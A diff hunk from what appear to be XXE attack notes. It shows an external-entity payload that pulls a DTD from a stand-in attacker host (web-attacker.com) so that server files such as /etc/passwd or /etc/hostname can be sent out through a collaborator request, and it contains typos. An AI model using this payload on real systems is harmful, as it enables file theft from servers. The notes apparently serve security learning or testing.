@@ -12,6 +12,8 @@ once we have our malicious server setup we can request external entities like th
 <!DOCTYPE foo [<!ENTITY % xxe SYSTEM
 "http://web-attacker.com/malicious.dtd"> %xxe;]>
 
+the data should be in collaborator request method
+
 which can give us desired output
 sometimes /etc/password may not work as it may have multiple lines with newline then we can use /etc/hostname wi=hich contains single lines
 
